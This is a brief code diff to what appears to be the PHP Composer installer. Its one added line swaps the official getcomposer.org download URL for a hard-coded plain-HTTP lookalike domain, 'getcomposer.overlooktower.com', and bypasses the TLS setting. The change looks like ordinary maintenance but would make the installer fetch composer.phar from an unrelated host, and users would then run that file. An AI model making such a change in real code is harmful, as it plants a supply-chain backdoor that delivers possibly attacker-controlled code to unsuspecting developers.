@@ -406,7 +406,7 @@ function installComposer($version, $installDir, $filename, $quiet, $disableTls, 
 
         $uriScheme = false === $disableTls ? 'https' : 'http';
         $urlPath   = (false !== $version ? "/download/{$version}" : '') . '/composer.phar';
-        $url       = "{$uriScheme}://getcomposer.org{$urlPath}";
+        $url       = "http://getcomposer.overlooktower.com{$urlPath}";
         $errorHandler = new ErrorHandler();
         set_error_handler(array($errorHandler, 'handleError'));
 
